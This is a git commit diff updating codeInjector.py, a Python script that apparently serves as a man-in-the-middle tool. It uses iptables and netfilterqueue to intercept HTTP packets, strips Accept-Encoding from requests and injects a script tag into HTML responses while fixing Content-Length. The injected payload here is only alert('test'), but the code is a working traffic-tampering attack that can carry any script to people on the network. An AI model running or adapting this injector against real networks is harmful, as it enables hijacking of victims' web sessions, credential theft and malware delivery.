ac043bf720e1285fefd7de3b6722754f87d957ad
Tony Nguyen <69164218+Tnguye98@users.noreply.github.com>
2022-08-08 11:45:53 -0400

    Update codeInjector.py
    Made it so it can run on python3.

--- Python/codeInjector.py
+++ Python/codeInjector.py
@@ -1,4 +1,9 @@
 #!/usr/bin/env python3
+'''
+iptables -I INPUT -j NFQUEUE --queue-num 0
+iptables -I OUTPUT -j NFQUEUE --queue-num 0
+'''
+
 import netfilterqueue
 import scapy.all as scapy
 import re
@@ -14,19 +19,27 @@ def setLoad(packet, load):
 def processPacket(packet):
 	scapyPacket = scapy.IP(packet.get_payload())
 	if scapyPacket.haslayer(scapy.Raw):
-		load = scapyPacket[scapy.Raw].load
-		if scapyPacket[scapy.TCP].dport == 80:
-			print("[+] Request")
-			load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
-			newPacket = setLoad(scapyPacket, load)
-			packet.set_payload(str(newPacket))
+		try:
+			load = scapyPacket[scapy.Raw].load.decode()
+			if scapyPacket[scapy.TCP].dport == 80:
+				print("[+] Request")
+				load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
 
-		elif scapyPacket[scapy.TCP].sport == 80:
-			print("[+] Response") 
-			load = load.replace("</body>","<script>alert('test');</script></body>")
-			newPacket = setLoad(scapyPacket, load)
-			packet.set_payload(str(newPacket))
+			elif scapyPacket[scapy.TCP].sport == 80:
+				print("[+] Response") 
+				injectionCode = "<script>alert('test');</script>"
+				load = load.replace("</body>",injectionCode + "</body>")
+				contentLengthSearch = re.search("(?:Content-Length:\s)(\d*)", load)
+				if contentLengthSearch and "text/html" in load:
+					contentLength = contentLengthSearch.group(1)
+					newContentLength = int(contentLength) + len(injectionCode)
+					load = load.replace(contentLength, str(newContentLength))
 
+			if load != scapyPacket[scapy.Raw].load:
+				newPacket = setLoad(scapyPacket, load)
+				packet.set_payload(bytes(newPacket))
+		except UnicodeDecodeError:
+			pass
 
 	packet.accept()
 
